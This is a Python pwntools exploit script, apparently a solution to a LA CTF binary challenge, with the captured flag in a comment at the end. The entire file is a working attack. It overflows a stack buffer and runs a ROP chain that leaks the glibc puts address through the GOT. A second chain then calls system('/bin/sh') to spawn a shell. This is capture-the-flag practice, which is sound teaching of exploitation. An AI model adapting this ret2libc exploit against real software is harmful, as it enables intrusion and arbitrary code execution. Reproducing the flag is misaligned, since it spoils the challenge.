from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    b *0x401266
    b *0x401387
    continue
''')

# p = remote('chall.lac.tf', 31137)

e = ELF('./chall')
glibc_e = ELF('./libc.so.6')

# 1. ROP with special gadgets to retrieve glibc base address
p.sendlineafter(b"2. Multiplayer\n", b'1')
FAKE_RBP = 0x404800
GADGET_1 = 0x4011bb  # ret;
READ_INT = 0x401176  # read_int function can leave arbitrary value in rax
GADGET_2 = 0x401367  # mov rdi, rax; call puts; mov eax, 0x0; call read_int; cmp eax, 0x1; je 0x4011d8
chain1 = [
    GADGET_1,
    READ_INT,
    GADGET_2
]
p.sendlineafter(b"Enter world name:\n", b'A'*0x40+p64(FAKE_RBP)+b''.join([p64(c1) for c1 in chain1]))
p.sendlineafter(b"2. Creative\n", b'1')
p.sendlineafter(b"2. Exit\n", b'2')
# leave puts@got in rax
p.sendline(str(e.got.puts).encode())
# call puts(puts@got) to leak glibc puts address
glibc_base_addr = u64(p.recvline().strip().ljust(8, b'\x00'))-glibc_e.sym.puts
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# satisfy "call read_int; cmp eax, 0x1; je 0x4011d8" to jump to 0x4011d8
p.sendline(b'1')

# 2. ROP to trigger system('/bin/sh\x00')
p.sendlineafter(b"2. Multiplayer\n", b'1')
chain2 = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
p.sendlineafter(b"Enter world name:\n", b'B'*0x40+p64(FAKE_RBP)+b''.join([p64(c2) for c2 in chain2]))
p.sendlineafter(b"2. Creative\n", b'1')
p.sendlineafter(b"2. Exit\n", b'2')

p.interactive()

# lactf{miiineeeee_diaaaaamoooonddsssssss_ky8cnd5e}